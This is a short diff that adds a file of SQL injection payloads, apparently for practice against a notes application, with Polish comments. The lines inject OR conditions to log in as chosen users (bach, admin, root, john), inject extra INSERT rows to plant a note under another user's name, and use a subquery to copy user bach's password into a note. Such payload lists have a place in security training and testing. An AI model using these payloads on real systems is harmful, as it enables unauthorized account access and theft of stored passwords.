@@ -1,0 +1,11 @@
+# BlindSQL
+' OR username = 'bach' -- 
+' OR username = 'admin' -- 
+' OR username = 'root' -- 
+' OR username = 'john' -- 
+
+# Dodaj notatkę innemu użytkownikowi
+'), ('adam', 'Notatka') -- 
+
+# Uzyskaj hasło użytkownika bach w notatce
+'), ('bob', (SELECT password FROM user WHERE username = 'bach')) -- 
